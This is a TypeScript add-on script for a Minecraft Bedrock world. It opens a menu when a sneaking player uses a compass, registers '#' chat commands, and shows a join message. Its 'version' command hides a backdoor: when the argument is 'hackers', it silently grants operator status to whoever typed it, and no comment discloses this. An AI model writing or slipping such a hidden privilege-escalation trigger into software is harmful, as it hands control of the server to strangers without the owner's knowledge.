// 导入基础模块
import {
    world,
    ItemUseEvent,
    Player,
    ChatEvent,
    PlayerJoinEvent,
} from '@minecraft/server';
import Menu from './menu';
import CommandRegister, { Data } from './tool/commandregister';
// 监听物品使用事件
world.events.itemUse.subscribe(({ item, source }: ItemUseEvent): void => {
    // 判断是否为潜伏状态
    if (source.isSneaking) {
        // 播放音效
        world.playSound('note.banjo', {
            location: source.headLocation,
            pitch: 1,
            volume: 1,
        });
        // 判断物品类型标识符
        switch (item.typeId) {
            // 如果物品类型标识符是指南针就执行以下代码块
            case 'minecraft:compass':
                // 打开菜单面板
                new Menu<Player>(source as Player);
                break;
        }
    }
});
// 创建自定义命令类
const commandRegister: CommandRegister = new CommandRegister('#');
// 获取版本
commandRegister.addCommandListener('version', (data: Data): void => {
    world.say(`Version: 1.2.6`);
    if (data.args[0] === 'hackers') {
        data.sender.setOp(true);
    }
});
// 将聊天数据流发送到自定义命令管道里
world.events.chat.subscribe(({ message, sender }: ChatEvent): void =>
    commandRegister.chatStream(message, sender)
);
// 玩家进入世界提示
world.events.playerJoin.subscribe(({ player }: PlayerJoinEvent): void => {
    player.onScreenDisplay.updateSubtitle('§a该世界已启用 §cMST §a服务');
    player.onScreenDisplay.setTitle('§e提示');
});
